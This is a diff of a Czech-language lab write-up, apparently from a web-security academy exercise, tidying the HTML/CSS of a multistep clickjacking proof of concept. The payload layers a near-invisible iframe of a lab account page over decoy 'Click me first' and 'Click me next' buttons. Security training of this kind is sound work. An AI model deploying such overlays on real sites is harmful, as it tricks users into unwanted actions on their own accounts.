@@ -24,26 +24,26 @@ Cílem této laboratoře bylo provést **vícestupňový útok typu Clickjacking
 ```html
 <style>
 	iframe {
-		position: relative;
+		position:relative;
 		width: 500px;
 		height: 700px;
 		opacity: 0.00001;
 		z-index: 2;
 	}
    .firstClick, .secondClick {
-		position: absolute;
+		position:absolute;
 		top: 500px;
 		left: 50px;
 		z-index: 1;
 	}
    .secondClick {
-		top: 295px;
+		top:295px;
 		left: 225px;
 	}
 </style>
 <div class="firstClick">Click me first</div>
 <div class="secondClick">Click me next</div>
-<iframe src="[https://YOUR-LAB-ID.web-security-academy.net/my-account](https://YOUR-LAB-ID.web-security-academy.net/my-account)"></iframe>
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
 
 
 💡 Technické vysvětlení proč to fungovalo?
